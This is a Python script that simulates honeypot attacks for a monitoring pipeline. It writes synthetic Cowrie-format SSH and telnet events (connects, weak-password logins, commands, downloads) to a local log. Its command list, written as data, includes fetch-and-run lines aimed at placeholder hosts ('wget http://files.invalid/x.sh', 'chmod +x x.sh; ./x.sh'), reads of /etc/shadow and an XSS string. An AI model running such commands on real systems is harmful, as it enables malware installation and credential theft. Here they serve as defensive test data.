#!/usr/bin/env python3
"""SENTINEL attack simulator.

Appends fake honeypot events, in the exact JSON Lines format of Cowrie,
to a shared log file that Logstash reads. See README.md for the contract.

Only the standard library is used. No network access is needed or used.
"""

import argparse
import hashlib
import json
import os
import random
import signal
import sys
import threading
import time
import uuid
from datetime import datetime, timezone

DEFAULT_OUTPUT = "/var/log/honeypot/cowrie.json"
# Accepted range for SIMULATOR_RATE / --rate, in events per minute. The upper
# bound keeps a typo from flooding the disk shared with the host.
MIN_RATE = 1
MAX_RATE = 1000
# Size at which the log is rotated: it becomes <file>.1 and a new file starts.
# With one rotated copy, the simulator never uses more than ~2x this on disk.
ROTATE_BYTES = 50 * 1024 * 1024
SENSOR = "honeypot-sim"
DST_IP = "172.18.0.2"

# Events per minute and behaviour for each mode.
MODES = {
    "basic": {"rate": 10, "max_sessions": 2, "weights": {"scan": 40, "login": 40, "intrusion": 20, "burst": 0}},
    "enriched": {"rate": 30, "max_sessions": 4, "weights": {"scan": 20, "login": 25, "intrusion": 30, "burst": 25}},
    "stress": {"rate": 200, "max_sessions": 10, "weights": {"scan": 15, "login": 25, "intrusion": 30, "burst": 30}},
}

# Public /16 prefixes spread over several countries. They are approximate:
# the country shown on the map is whatever the Logstash GeoIP database says.
# What matters is that the addresses are public, so they can be geolocated.
IP_PREFIXES = [
    "114.114", "119.147", "218.92",    # China
    "95.213", "5.188", "46.161",       # Russia
    "177.12", "189.40", "201.17",      # Brazil
    "49.36", "103.21", "117.200",      # India
    "45.33", "104.248", "159.65",      # United States
    "85.214", "78.46", "138.201",      # Germany
    "175.126", "211.234",              # South Korea
    "113.161", "14.162",               # Vietnam
    "51.15", "91.121",                 # France
]

CREDENTIALS = [
    ("root", "root"), ("root", "123456"), ("root", "password"), ("root", "admin"),
    ("admin", "admin"), ("admin", "1234"), ("admin", "password"), ("user", "user"),
    ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("test", "test"), ("oracle", "oracle"),
    ("postgres", "postgres"), ("ftpuser", "ftpuser"), ("support", "support"),
    ("guest", "guest"), ("root", "toor"), ("root", "qwerty"), ("git", "git"),
]

COMMANDS = [
    "uname -a", "whoami", "id", "cat /etc/passwd", "ls -la", "pwd", "ps aux",
    "cat /proc/cpuinfo", "free -m", "ifconfig", "crontab -l", "history",
    "cd /tmp; ls", "wget http://files.invalid/x.sh", "curl -O http://files.invalid/bot",
    "chmod +x x.sh; ./x.sh", "echo <script>alert(1)</script>", "cat /etc/shadow",
]

DOWNLOAD_URLS = [
    "http://files.invalid/x.sh", "http://files.invalid/bot.arm7",
    "http://payload.invalid/miner", "http://payload.invalid/update.bin",
]

SSH_VERSIONS = ["SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-OpenSSH_8.9p1", "SSH-2.0-paramiko_3.4.0"]

_last_us = None
# Set by the signal handler. The main loop waits on it instead of sleeping:
# time.sleep is not interrupted by a signal, so at low rates the simulator
# would still be asleep when Docker sends SIGKILL, 10 s after SIGTERM.
_stop_event = threading.Event()


def now_utc():
    """UTC time in Cowrie format. Strictly increasing so events stay unique."""
    global _last_us
    # Whole microseconds: adding 1 is exact (float seconds are not), so two
    # events never share a timestamp, even if the clock repeats or goes back.
    us = time.time_ns() // 1000
    if _last_us is not None and us <= _last_us:
        us = _last_us + 1
    _last_us = us
    seconds, micros = divmod(us, 1000000)
    return datetime.fromtimestamp(seconds, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S") + ".%06dZ" % micros


def random_ip():
    return "%s.%d.%d" % (random.choice(IP_PREFIXES), random.randint(1, 254), random.randint(1, 254))


class Session:
    """One attack session: a coherent, ordered list of events."""

    def __init__(self, kind):
        self.id = uuid.uuid4().hex[:12]
        self.kind = kind
        self.src_ip = random_ip()
        self.src_port = random.randint(1024, 65535)
        self.protocol = "telnet" if random.random() < 0.2 else "ssh"
        self.dst_port = 2323 if self.protocol == "telnet" else 2222
        self.started = time.monotonic()
        self.steps = self._build_steps()

    def _build_steps(self):
        steps = [("cowrie.session.connect", {})]
        if self.protocol == "ssh":
            steps.append(("cowrie.client.version", {"version": random.choice(SSH_VERSIONS)}))
        if self.kind == "login":
            steps += self._failed_logins(random.randint(1, 3))
        elif self.kind == "burst":
            steps += self._failed_logins(random.randint(6, 15))
        elif self.kind == "intrusion":
            steps += self._failed_logins(random.randint(0, 2))
            user, pwd = random.choice(CREDENTIALS)
            steps.append(("cowrie.login.success", {"username": user, "password": pwd}))
            for _ in range(random.randint(1, 5)):
                steps.append(("cowrie.command.input", {"input": random.choice(COMMANDS)}))
            if random.random() < 0.25:
                digest = hashlib.sha256(os.urandom(16)).hexdigest()
                steps.append(("cowrie.session.file_download", {
                    "url": random.choice(DOWNLOAD_URLS),
                    "outfile": "var/lib/cowrie/downloads/" + digest,
                    "shasum": digest,
                }))
        steps.append(("cowrie.session.closed", {}))
        return steps

    @staticmethod
    def _failed_logins(count):
        out = []
        for _ in range(count):
            user, pwd = random.choice(CREDENTIALS)
            out.append(("cowrie.login.failed", {"username": user, "password": pwd}))
        return out

    @property
    def done(self):
        return not self.steps

    def next_event(self):
        eventid, extra = self.steps.pop(0)
        event = {"eventid": eventid}
        event.update(extra)
        # Connection fields go on every event of the session, as Cowrie does.
        event["src_ip"] = self.src_ip
        event["src_port"] = self.src_port
        event["dst_ip"] = DST_IP
        event["dst_port"] = self.dst_port
        event["session"] = self.id
        event["protocol"] = self.protocol
        event["sensor"] = SENSOR
        if eventid == "cowrie.session.connect":
            event["message"] = "New connection: %s:%d" % (self.src_ip, self.src_port)
        elif eventid == "cowrie.client.version":
            event["message"] = "Remote SSH version: %s" % extra["version"]
        elif eventid == "cowrie.login.failed":
            event["message"] = "login attempt [%s/%s] failed" % (extra["username"], extra["password"])
        elif eventid == "cowrie.login.success":
            event["message"] = "login attempt [%s/%s] succeeded" % (extra["username"], extra["password"])
        elif eventid == "cowrie.command.input":
            event["message"] = "CMD: %s" % extra["input"]
        elif eventid == "cowrie.session.file_download":
            event["message"] = "Downloaded URL (%s) with SHA-256 %s to %s" % (
                extra["url"], extra["shasum"], extra["outfile"])
        elif eventid == "cowrie.session.closed":
            duration = round(time.monotonic() - self.started, 1)
            event["duration"] = duration
            event["message"] = "Connection lost after %s seconds" % duration
        event["timestamp"] = now_utc()
        return event


def pick_kind(weights):
    kinds = list(weights)
    return random.choices(kinds, weights=[weights[k] for k in kinds])[0]


def stop(_signum, _frame):
    _stop_event.set()


def parse_rate(value):
    """Events per minute: an integer from MIN_RATE to MAX_RATE."""
    try:
        rate = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError("must be an integer, got %r" % value) from None
    if not MIN_RATE <= rate <= MAX_RATE:
        raise argparse.ArgumentTypeError("must be between %d and %d, got %d" % (MIN_RATE, MAX_RATE, rate))
    return rate


def open_log(output):
    """Open the log for appending, line buffered so Logstash sees each event at once."""
    return open(output, "a", encoding="utf-8", buffering=1)


def rotate(fh, output):
    """Keep the full log as <output>.1 (replacing the previous one) and start a new one.

    The file is renamed, never truncated: Logstash follows files by inode, so it
    finishes reading the renamed file and then picks up the new one. Truncating
    in place (copytruncate) can lose or repeat lines.
    """
    fh.close()
    os.replace(output, output + ".1")
    print("simulator: rotated %s to %s.1" % (output, output), flush=True)
    return open_log(output)


def run(mode, rate, output):
    cfg = MODES[mode]
    interval = 60.0 / rate
    folder = os.path.dirname(output)
    if folder:
        os.makedirs(folder, exist_ok=True)
    active = []
    total = 0
    print("simulator: mode=%s rate=%d/min output=%s" % (mode, rate, output), flush=True)

    fh = open_log(output)
    size = os.fstat(fh.fileno()).st_size  # an existing file keeps growing
    burst = None
    try:
        while not _stop_event.is_set():
            # A burst keeps the loop until it ends, so its failed logins come
            # one after another from the same IP, with no other session between.
            if burst is not None and not burst.done:
                session = burst
            else:
                if len(active) < cfg["max_sessions"]:
                    active.append(Session(pick_kind(cfg["weights"])))
                session = random.choice(active)
                burst = session if session.kind == "burst" else None

            line = json.dumps(session.next_event(), separators=(",", ":")) + "\n"
            fh.write(line)
            fh.flush()
            size += len(line.encode("utf-8"))
            total += 1
            # Rotate between events, so no line is ever split across files.
            if size >= ROTATE_BYTES:
                fh = rotate(fh, output)
                size = 0
            if session.done:
                active.remove(session)

            # One event per interval: the average rate is exactly the configured
            # one, and the longest pause is 1.3 intervals (78 s at 1 event/min).
            # wait() returns as soon as stop() sets the event.
            _stop_event.wait(interval * random.uniform(0.7, 1.3))
    finally:
        fh.close()
    print("simulator: stopped after %d events" % total, flush=True)


def main():
    parser = argparse.ArgumentParser(description="SENTINEL attack simulator (Cowrie JSON format)")
    parser.add_argument("--mode", choices=sorted(MODES), default=os.environ.get("SIMULATOR_MODE", "basic"),
                        help="behaviour and default rate (env SIMULATOR_MODE)")
    # An empty SIMULATOR_RATE means "not set": the mode's own rate is used.
    parser.add_argument("--rate", type=parse_rate, default=os.environ.get("SIMULATOR_RATE") or None,
                        help="events per minute, overrides the mode's rate (env SIMULATOR_RATE)")
    parser.add_argument("--output", default=os.environ.get("OUTPUT_FILE", DEFAULT_OUTPUT),
                        help="log file to append to (env OUTPUT_FILE)")
    args = parser.parse_args()
    if args.mode not in MODES:
        sys.exit("invalid SIMULATOR_MODE: %s (use basic, enriched or stress)" % args.mode)
    rate = args.rate or MODES[args.mode]["rate"]
    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)
    run(args.mode, rate, args.output)


if __name__ == "__main__":
    main()
